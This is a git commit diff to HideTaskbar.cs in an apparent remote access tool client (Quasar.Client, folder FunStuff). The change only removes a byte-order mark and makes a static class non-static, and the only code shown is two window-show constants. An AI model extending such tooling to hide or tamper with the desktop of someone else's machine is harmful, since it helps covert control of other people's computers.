11119194e2a5a7544a7890f002f20d8a4466638d
Ethan <ethan@genocide.fun>
2025-03-16 20:56:23 +0000

    Update HideTaskbar.cs

--- Quasar.Client/FunStuff/HideTaskbar.cs
+++ Quasar.Client/FunStuff/HideTaskbar.cs
@@ -1,10 +1,10 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 namespace Quasar.Client.FunStuff
 {
-    public static class HideTaskbar
+    public class HideTaskbar
     {
         private const int SW_HIDE = 0;
         private const int SW_SHOW = 5;
